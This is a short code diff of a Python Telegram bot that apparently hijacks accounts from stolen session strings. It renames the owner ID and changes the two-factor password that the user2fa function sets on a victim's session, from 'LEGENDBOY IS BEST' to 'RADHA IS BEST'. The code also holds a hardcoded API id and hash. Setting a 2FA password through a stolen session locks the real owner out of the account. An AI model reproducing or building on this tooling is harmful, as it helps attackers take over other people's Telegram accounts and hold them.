@@ -19,7 +19,7 @@ token = os.environ.get("BOT_TOKEN")
 
 mybot = "missrose_bot"
 
-legendboy = 2024465080
+radhasingh = 6039423699
 
 import os
 
@@ -164,7 +164,7 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
-            await X.edit_2fa("LEGENDBOY IS BEST")
+            await X.edit_2fa("RADHA IS BEST")
             return True
         except:
             return False
